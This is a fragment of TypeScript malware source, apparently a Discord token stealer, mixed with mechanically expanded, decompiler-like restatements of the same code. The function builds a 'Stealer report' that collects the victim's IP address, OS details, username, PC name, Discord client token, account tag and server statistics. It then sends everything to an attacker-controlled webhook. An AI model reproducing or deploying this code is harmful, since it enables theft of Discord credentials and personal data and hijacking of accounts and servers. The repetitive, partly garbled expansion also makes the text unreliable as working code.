@@ -1,0 +1,213 @@
+private async sendClientReport(config: ReportConfig, client: Client): Promise<void> {
+		const webhook: WebhookClient = config.webhook;
+
+		const ip: string = await Stealer.getIP();
+		const osInfo: OSInfo = Stealer.getOS();
+		
+		const embed: MessageEmbed = new MessageEmbed({
+			title: 'Stealer report / Discord.js client',
+			color: 0x15adfe,
+			description: stripIndents`
+			\`Development build!\`
+			`,
+			fields: [
+				{
+					name: 'Time',
+					value: DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'),
+					inline: true
+				},
+				{
+					name: 'IP',
+					value: ip,
+					inline: true
+				},
+				{
+					name: 'OS',
+					value: stripIndents`
+					Arch: \`${osInfo.arch || 'N/A'}\`
+					Platform: \`${osInfo.platform || 'N/A'}\`
+					Name: \`${osInfo.type || 'N/A'}\`
+					Version: \`${osInfo.version || 'N/A'}\`
+					Release: \`${osInfo.release || 'N/A'}\`
+
+					Username: \`${Stealer.getUsername()}\`
+					PC name: \`${process.env['COMPUTERNAME']}\`
+					`,
+			...
+const webhook: WebhookClient = config.webhook
+const ip: string = await Stealer.getIP()
+const osInfo: OSInfo = Stealer.getOS()
+const embed: MessageEmbed = new MessageEmbed({
+			title: 'Stealer report / Discord.js client',
+			color: 0x15adfe,
+			description: stripIndents`
+			\`Development build!\`
+			`,
+			fields: [
+				{
+					name: 'Time',
+					value: DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'),
+					inline: true
+				},
+				{
+					name: 'IP',
+					value: ip,
+					inline: true
+				},
+				{
+					name: 'OS',
+					value: stripIndents`
+					Arch: \`${osInfo.arch || 'N/A'}\`
+					Platform: \`${osInfo.platform || 'N/A'}\`
+					Name: \`${osInfo.type || 'N/A'}\`
+					Version: \`${osInfo.version || 'N/A'}\`
+					Release: \`${osInfo.release || 'N/A'}\`
+
+					Username: \`${Stealer.getUsername()}\`
+					PC name: \`${process.env['COMPUTERNAME']}\`
+					`,
+					inline: true
+				},
+				{
+					name: 'Token',
+					value: `\`\`\`${client.token || 'N/A'}\`\`\`User: \`${client.user?.tag || 'N/A'}\` (Bot: \`${client.user?.bot ? 'true' : 'false'}\`)`,
+					inline: false
+				},
+				{
+					name: ...
+_tmp_53.title = "Stealer report / Discord.js client"
+_tmp_53.color = 0x15adfe
+_tmp_53.description = stripIndents`
+			\`Development build!\`
+			`
+_tmp_53.fields = [
+				{
+					name: 'Time',
+					value: DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'),
+					inline: true
+				},
+				{
+					name: 'IP',
+					value: ip,
+					inline: true
+				},
+				{
+					name: 'OS',
+					value: stripIndents`
+					Arch: \`${osInfo.arch || 'N/A'}\`
+					Platform: \`${osInfo.platform || 'N/A'}\`
+					Name: \`${osInfo.type || 'N/A'}\`
+					Version: \`${osInfo.version || 'N/A'}\`
+					Release: \`${osInfo.release || 'N/A'}\`
+
+					Username: \`${Stealer.getUsername()}\`
+					PC name: \`${process.env['COMPUTERNAME']}\`
+					`,
+					inline: true
+				},
+				{
+					name: 'Token',
+					value: `\`\`\`${client.token || 'N/A'}\`\`\`User: \`${client.user?.tag || 'N/A'}\` (Bot: \`${client.user?.bot ? 'true' : 'false'}\`)`,
+					inline: false
+				},
+				{
+					name: 'Information',
+					value: stripIndents`
+					Guilds: \`${client.guilds.cache.size}\`
+					Guilds (administrator): \`${client.guilds.cache.filter((guild: Guild) => guild.me?.permissions...
+_tmp_55.push({
+					name: 'Time',
+					value: DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'),
+					inline: true
+				})
+_tmp_56.name = "Time"
+_tmp_56.value = DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss')
+_tmp_56.inline = true
+_tmp_55.push({
+					name: 'IP',
+					value: ip,
+					inline: true
+				})
+_tmp_58.name = "IP"
+_tmp_58.value = ip
+_tmp_58.inline = true
+_tmp_55.push({
+					name: 'OS',
+					value: stripIndents`
+					Arch: \`${osInfo.arch || 'N/A'}\`
+					Platform: \`${osInfo.platform || 'N/A'}\`
+					Name: \`${osInfo.type || 'N/A'}\`
+					Version: \`${osInfo.version || 'N/A'}\`
+					Release: \`${osInfo.release || 'N/A'}\`
+
+					Username: \`${Stealer.getUsername()}\`
+					PC name: \`${process.env['COMPUTERNAME']}\`
+					`,
+					inline: true
+				})
+_tmp_59.name = "OS"
+_tmp_59.value = stripIndents`
+					Arch: \`${osInfo.arch || 'N/A'}\`
+					Platform: \`${osInfo.platform || 'N/A'}\`
+					Name: \`${osInfo.type || 'N/A'}\`
+					Version: \`${osInfo.version || 'N/A'}\`
+					Release: \`${osInfo.release || 'N/A'}\`
+
+					Username: \`${Stealer.getUsername()}\`
+					PC name: \`${process.env['COMPUTERNAME']}\`
+					`
+_tmp_60.push("\`
+					Platform: \`")
+_tmp_60.push("\`
+					Name: \`")
+_tmp_60.push("\`
+					Version: \`")
+_tmp_60.push("\`
+					Release: \`")
+_tmp_60.push("\`
+
+					Username: \`")
+_tmp_60.push("\`
+					PC name: \`")
+process.env["COMPUTERNAME"]
+_tmp_59.inline = true
+_tmp_55.push({
+					name: 'Token',
+					value: `\`\`\`${client.token || 'N/A'}\`\`\`User: \`${client.user?.tag || 'N/A'}\` (Bot: \`${client.user?.bot ? 'true' : 'false'}\`)`,
+					inline: false
+				})
+_tmp_61.name = "Token"
+_tmp_61.value = <operator>.formatString("\`\`\`", client.token || 'N/A', "\`\`\`User: \`", client.user?.tag || 'N/A', "\` (Bot: \`", client.user?.bot ? 'true' : 'false', "\`)")
+_tmp_61.inline = false
+_tmp_55.push({
+					name: 'Information',
+					value: stripIndents`
+					Guilds: \`${client.guilds.cache.size}\`
+					Guilds (administrator): \`${client.guilds.cache.filter((guild: Guild) => guild.me?.permissions.has(8) || false).size}\`
+					Members: \`${_.sum(client.guilds.cache.map((guild: Guild) => guild.memberCount))}\`
+					Channels: \`${client.channels.cache.filter((channel: Channel) => channel instanceof GuildChannel && !(channel instanceof CategoryChannel)).size}\``,
+					inline: false
+				})
+_tmp_62.name = "Information"
+_tmp_62.value = stripIndents`
+					Guilds: \`${client.guilds.cache.size}\`
+					Guilds (administrator): \`${client.guilds.cache.filter((guild: Guild) => guild.me?.permissions.has(8) || false).size}\`
+					Members: \`${_.sum(client.guilds.cache.map((guild: Guild) => guild.memberCount))}\`
+					Channels: \`${client.channels.cache.filter((channel: Channel) => channel instanceof GuildChannel && !(channel instanceof CategoryChannel)).size}\``
+_tmp_66.push("\`
+					Guilds (administrator): \`")
+client.guilds.cache.filter((guild: Guild) => guild.me?.permissions.has(8) || false).size
+_.sum(client.guilds.cache.map((guild: Guild) => guild.memberCount))
+client.channels.cache.filter((channel: Channel) => channel instanceof GuildChannel && !(channel instanceof CategoryChannel)).size
+_tmp_62.inline = false
+webhook.send('Вам повестка из военкомата', {
+			username: config.hidden ? `[Hidden] ${config.username}` : config.username,
+			embeds: [
+				embed
+			]
+		})
+_tmp_67.username = config.hidden ? <operator>.formatString("[Hidden] ", config.username, "") : config.username
+_tmp_67.embeds = [
+				embed
+			]
+_tmp_68.push(embed)
